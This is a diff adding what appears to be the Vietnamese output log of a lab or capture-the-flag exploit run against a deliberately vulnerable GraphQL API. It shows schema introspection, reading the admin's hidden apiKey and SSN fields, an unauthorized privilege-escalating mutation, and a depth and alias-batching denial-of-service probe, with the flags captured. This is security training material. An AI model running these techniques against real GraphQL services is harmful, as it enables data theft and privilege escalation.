@@ -1,0 +1,21 @@
+[*] Buoc 1: INTROSPECTION - tai schema
+    queryType    = Query
+    mutationType = Mutation
+    field cua type User: ['id', 'username', 'email', 'isAdmin', 'apiKey', 'ssn', 'posts']
+    => phat hien field nhay cam: ['apiKey', 'ssn']
+    => phat hien mutation: ['promoteUser']
+
+[*] Buoc 2: truy van thang field nhay cam apiKey cua admin (id=1)
+    user(1) = {'apiKey': 'FLAG{9.2_graphql_introspection_hidden_field}', 'isAdmin': True, 'ssn': '999-99-9999', 'username': 'admin'}
+    [+] apiKey (flag) = FLAG{9.2_graphql_introspection_hidden_field}
+
+[*] Buoc 3: goi mutation promoteUser bang client thuong (khong token admin)
+    {'flag': 'FLAG{9.2_graphql_mutation_no_authz}', 'message': 'user 2 da duoc nang quyen (KHONG kiem tra authorization)', 'ok': True}
+
+[*] Buoc 4: DoS - query long nhau (author <-> posts) va alias batching
+    query long 5 tang chay duoc, khong bi chan depth: True
+    alias batching: 1 request lay 12 lan field dat tien (apiKey)
+    => khong gioi han do sau/so luong => khuech dai chi phi, de DoS
+
+[+] Introspection flag: FLAG{9.2_graphql_introspection_hidden_field}
+[+] Mutation flag:      FLAG{9.2_graphql_mutation_no_authz}
